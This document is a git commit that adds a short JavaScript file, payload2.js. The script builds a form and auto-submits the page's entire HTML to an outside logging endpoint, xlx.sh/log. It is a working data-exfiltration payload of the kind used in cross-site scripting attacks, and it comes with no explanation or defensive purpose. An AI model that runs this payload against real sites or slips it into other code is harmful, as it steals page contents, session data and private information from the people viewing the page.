d3a4a49765fa0e02e02e1f359c306358a1c6bdf0
André Rüegg <andre@ruegg.me>
2025-06-25 22:52:39 -0700

    Create payload2.js

---
+++ payload2.js
@@ -0,0 +1,11 @@
+const form = document.createElement("form");
+form.action = "https://xlx.sh/log";
+form.method = "POST";
+
+const input = document.createElement("input");
+input.name = "data";
+input.value = document.documentElement.innerHTML;
+
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
